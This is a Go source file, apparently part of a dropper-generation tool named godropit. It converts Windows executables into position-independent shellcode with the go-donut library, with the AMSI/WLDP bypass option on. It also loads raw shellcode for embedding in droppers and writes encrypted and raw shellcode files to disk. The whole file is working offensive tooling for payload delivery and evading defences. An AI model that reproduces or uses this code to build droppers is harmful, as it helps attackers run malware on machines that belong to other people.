package gengo

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"

	"github.com/kopp0ut/godropit/pkg/dropfmt"

	"github.com/Binject/go-donut/donut"
	"github.com/fatih/color"
)

func writeShellcodeFiles(BufStr, KeyStr, output, dropname string, shellcode []byte) {

	scFilepath := filepath.Join(output, dropname+"_encryptedB64.txt")

	//Write shellcode files in case they are needed later.
	scFile, err := os.Create(scFilepath)
	if err != nil {
		log.Fatalf("Error creating shellcode file: %v ", err)

	}
	scFile.WriteString("ShellcodeKey: " + KeyStr + "\n")
	scFile.WriteString("ShellcodeBuf:\n" + BufStr)
	scFile.Close()
	binFilepath := filepath.Join(output, dropname+"_Raw.bin")
	fmt.Println(binFilepath)
	binFile, err := os.Create(binFilepath)
	if err != nil {
		log.Fatalf("Error creating shellcode file: %v ", err)

	}
	binFile.Write(shellcode)
	binFile.Close()
}

// Uses donut to generate 64bit shellcode from an exe.
func DonutShellcode(srcFile string, x86 bool) ([]byte, error) {

	donutArch := donut.X64
	if x86 {
		donutArch = donut.X32
	}

	config := new(donut.DonutConfig)
	config.Arch = donutArch
	config.Entropy = uint32(2)
	config.OEP = uint64(0)

	config.InstType = donut.DONUT_INSTANCE_PIC

	config.Entropy = uint32(3)
	config.Bypass = 3
	config.Compress = uint32(1)
	config.Format = uint32(1)
	config.Verbose = true

	config.ExitOpt = uint32(1)
	payload, err := donut.ShellcodeFromFile(srcFile, config)
	if err != nil {
		color.Red("[donut] %v\n", err)
		return nil, err

	}

	return payload.Bytes(), nil
}

func GetShellcode(input string) dropfmt.DropFmt {
	var shellcode []byte
	var errShellcode error
	var dropper dropfmt.DropFmt

	if strings.Contains(input, ".exe") {

		color.Yellow("Exe detected as an input file, attempting to generate shellcode with go-donut.\n")
		shellcode, errShellcode = DonutShellcode(input, false)
		if errShellcode != nil {
			color.Red(fmt.Sprintf("[!]%s", errShellcode.Error()))
			os.Exit(1)
		}

		dropper.Buf = shellcode

		return dropper

	} else {
		shellcode, errShellcode = os.ReadFile(input)

		if errShellcode != nil {
			color.Red(fmt.Sprintf("[!]%s", errShellcode.Error()))
			os.Exit(1)
		}
		dropper.Buf = shellcode

	}

	return dropper

}

func GetBytes(input string) dropfmt.DropFmt {
	var bytes []byte
	var errBytes error
	var dropper dropfmt.DropFmt

	bytes, errBytes = ioutil.ReadFile(input)

	if errBytes != nil {
		color.Red(fmt.Sprintf("[!]%s", errBytes.Error()))
		os.Exit(1)
	}
	dropper.Buf = bytes

	return dropper

}
